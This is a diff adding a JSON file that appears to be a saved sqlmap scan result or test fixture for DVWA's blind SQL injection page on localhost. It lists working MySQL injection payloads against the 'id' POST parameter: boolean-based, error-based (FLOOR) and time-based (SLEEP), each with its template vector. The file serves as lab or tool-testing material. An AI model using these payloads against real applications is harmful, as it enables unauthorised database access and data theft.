@@ -1,0 +1,88 @@
+{
+  "data": [
+    {
+      "status": 1,
+      "type": 0,
+      "value": {
+        "url": "http://localhost:80/dvwa/vulnerabilities/sqli_blind/",
+        "query": null,
+        "data": "id=1&Submit=Submit"
+      }
+    },
+    {
+      "status": 1,
+      "type": 1,
+      "value": [
+        {
+          "dbms": "MySQL",
+          "suffix": "",
+          "clause": [
+            1,
+            8,
+            9
+          ],
+          "notes": [],
+          "ptype": 1,
+          "dbms_version": [
+            ">= 5.0"
+          ],
+          "prefix": "",
+          "place": "POST",
+          "data": {
+            "1": {
+              "comment": "",
+              "matchRatio": null,
+              "title": "AND boolean-based blind - WHERE or HAVING clause",
+              "trueCode": 200,
+              "templatePayload": null,
+              "vector": "AND [INFERENCE]",
+              "falseCode": 200,
+              "where": 1,
+              "payload": "id=1 AND 3637=3637&Submit=Submit"
+            },
+            "2": {
+              "comment": "",
+              "matchRatio": null,
+              "title": "MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)",
+              "trueCode": null,
+              "templatePayload": null,
+              "vector": "OR (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
+              "falseCode": null,
+              "where": 1,
+              "payload": "id=1 OR (SELECT 3028 FROM(SELECT COUNT(*),CONCAT(0x717a6a7a71,(SELECT (ELT(3028=3028,1))),0x716b6a6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)&Submit=Submit"
+            },
+            "5": {
+              "comment": "",
+              "matchRatio": null,
+              "title": "MySQL >= 5.0.12 AND time-based blind (query SLEEP)",
+              "trueCode": 200,
+              "templatePayload": null,
+              "vector": "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])",
+              "falseCode": null,
+              "where": 1,
+              "payload": "id=1 AND (SELECT 8078 FROM (SELECT(SLEEP([SLEEPTIME])))LHoD)&Submit=Submit"
+            }
+          },
+          "conf": {
+            "code": null,
+            "string": "User ID exists in the database.",
+            "notString": null,
+            "titles": null,
+            "regexp": null,
+            "textOnly": null,
+            "optimize": null
+          },
+          "parameter": "id",
+          "os": null
+        }
+      ]
+    },
+    {
+      "status": 1,
+      "type": 3,
+      "value": ""
+    }
+  ],
+  "success": true,
+  "error": []
+}
